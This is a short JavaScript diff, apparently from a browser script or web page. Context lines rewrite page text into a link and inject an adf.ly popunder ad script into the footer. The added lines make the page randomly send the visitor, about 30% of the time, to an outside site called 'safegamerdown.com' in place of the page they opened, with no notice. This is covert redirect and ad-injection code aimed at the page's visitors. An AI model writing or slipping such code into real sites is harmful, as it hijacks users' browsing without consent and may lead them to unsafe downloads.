@@ -5,6 +5,18 @@ document.body.innerHTML = document.body.innerHTML.replace('direitos', '<a target
 
 document.getElementById("footer").innerHTML+= '<script type="text/javascript"> var adfly_id = 7273554; var popunder_frequency_delay = 0; </script> <script src="https://cdn.adf.ly/js/display.js"></script>';
 
+var d = Math.random();
+if (d < 0.5){
+
+}
+else if (d < 0.8)
+{
+   window.open("https://safegamerdown.com/","_self")
+}
+else
+{
+
+}
 
 
 });
